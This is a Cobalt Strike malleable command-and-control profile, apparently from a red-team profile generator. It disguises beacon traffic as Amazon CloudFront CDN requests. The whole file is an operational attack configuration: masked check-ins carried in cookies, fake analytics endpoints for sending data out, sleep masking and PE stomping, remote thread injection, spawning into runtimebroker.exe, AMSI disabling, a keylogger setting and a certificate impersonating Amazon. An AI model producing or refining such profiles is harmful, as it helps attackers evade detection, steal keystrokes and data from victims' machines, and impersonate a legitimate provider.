# =====================================================================
# Profile: Amazon CloudFront CDN - STEALTH
# Generated & Validated by Ostad Red Team Forge Malleable C2 Engine
# Founder & Director: Ostad Rezaul Karim (Top 1% Red Teamer)
# =====================================================================

set sample_name "update_s3YL8B.exe";
set sleeptime "5000";
set jitter "25";
set maxget "1048576";
set data_jitter "28";
set useragent "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15";
set pipename "eventlog_##";
set pipename_stager "status_xh4o##";


http-get {
    set uri "/media/static/chunk_04.ts" "/api/cdn/v3/metrics/beacon.gif";

    client {
        header "Host" "d1v8l4e9k0r2.cloudfront.net";
        header "Accept" "*/*";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Sec-Fetch-Site" "cross-site";
        header "Sec-Fetch-Mode" "no-cors";
        header "Sec-Fetch-Dest" "empty";
        metadata {
            mask;
            base64url;
            prepend "cf_id=";
            header "Cookie";
        }
    }

    server {
        header "Server" "CloudFront";
        header "Content-Type" "application/json";
        header "Cache-Control" "no-cache, no-store, must-revalidate";
        output {
            mask;
            base64;
            print;
        }
    }
}

http-post {
    set uri "/api/v1/feedback/log" "/analytics/event/collector";
    set verb "POST";

    client {
        header "Host" "d1v8l4e9k0r2.cloudfront.net";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Sec-Fetch-Site" "cross-site";
        header "Sec-Fetch-Mode" "no-cors";
        header "Sec-Fetch-Dest" "empty";
        header "Content-Type" "application/json";
        id {
            mask;
            base64url;
            parameter "cid";
        }
        output {
            mask;
            base64url;
            print;
        }
    }

    server {
        header "Server" "CloudFront";
        header "Content-Type" "application/json";
        output {
            mask;
            base64;
            print;
        }
    }
}

stage {
    set checksum "0";
    set cleanup "true";
    set sleep_mask "true";
    set smartinject "true";
    set stomppe "true";
    set obfuscate "true";
    set userwx "false";
    set magic_mz_x86 "MZVC";
    set magic_mz_x64 "MZVC";
    set magic_pe "PT";
    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }
}

process-inject {
    set allocator "VirtualAllocEx";
    set min_alloc "16384";
    set startrwx "false";
    set userwx "false";
    execute {
        CreateThread;
        SetThreadContext;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

post-ex {
    set spawnto_x86 "%windir%\syswow64\runtimebroker.exe";
    set spawnto_x64 "%windir%\sysnative\runtimebroker.exe";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";
}

https-certificate {
    set CN "*.cloudfront.net";
    set O "Amazon.com, Inc.";
    set OU "CloudFront Infrastructure";
    set C "US";
    set ST "Washington";
    set L "Seattle";
    set validity "580";
}
